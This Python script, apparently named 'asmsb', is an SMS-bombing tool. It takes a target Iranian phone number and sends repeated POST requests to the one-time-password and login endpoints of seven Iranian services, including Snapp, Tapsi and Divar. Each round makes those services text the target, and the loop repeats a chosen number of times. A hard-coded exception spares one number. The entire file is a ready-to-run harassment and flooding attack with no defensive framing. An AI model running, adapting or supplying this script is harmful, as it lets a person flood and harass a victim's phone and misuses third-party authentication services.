from argparse import ArgumentParser
from urllib3 import PoolManager
from json import dumps
from time import sleep
from re import search
def send(cellphone):
    http = PoolManager()
    http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        headers={'Content-Type': 'application/json'},
        body=dumps({"cellphone": f"+98{cellphone}"}).encode())

    http.request("post", "https://bikoplus.com/Auth/CheckPhoneNumber",
        headers={'Content-Type': 'application/json'},
        body=dumps({"AuthenticationMode":"1","phoneNumber": f"0{cellphone}"}).encode())

    http.request("post", "https://head-phone.ir/includes/ajax/login.php",
        headers={'Content-Type': 'application/json'},
        body=dumps({"mobile": f"0{cellphone}"}).encode())
    
    http.request("post", "https://api2.fafait.net/oauth/check-user",
        headers={'Content-Type': 'application/json'},
        body=dumps({"id": f"0{cellphone}"}).encode())

    http.request("post", "https://lipak.com/api/v1/auth/init",
        headers={'Content-Type': 'application/json','phone_number': f'0{cellphone}'},
         body=dumps({}).encode())
    
    http.request("post", "https://api.tapsi.ir/api/v2/user",
        headers={'Content-Type': 'application/json'},
        body=dumps({"credential": {"phoneNumber": f"0{cellphone}", "role": "DRIVER"}}).encode())
    
    http.request("post", "https://api.divar.ir/v5/auth/authenticate",
        headers={'Content-Type': 'application/json'},
        body=dumps({"phone": f'0{cellphone}'}).encode())
def ops(args):
    if (search(r'9\d{9}$', args.cellphone) and args.cellphone != "9059599230"):
        for time in range(args.times):
            print(f"\rSending sms {time+1}/{args.times}", end='')
            try:
                send(args.cellphone)
            except KeyboardInterrupt:
                exit()
            sleep(2)
        print('')
    else:
        print("error: invalid cellphone format, format: 9\d{9} e.g. 90151xxxx OR 9059599230 is Not Valid!")
def main():
    parser = ArgumentParser(prog="asmsb",
        description="OPS",
        epilog="By OPS")
    parser.add_argument("cellphone", help="target cellphone: e.g. 90157xxxxx")
    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=10)
    ops(parser.parse_args())

if (__name__ == "__main__"):
    main()


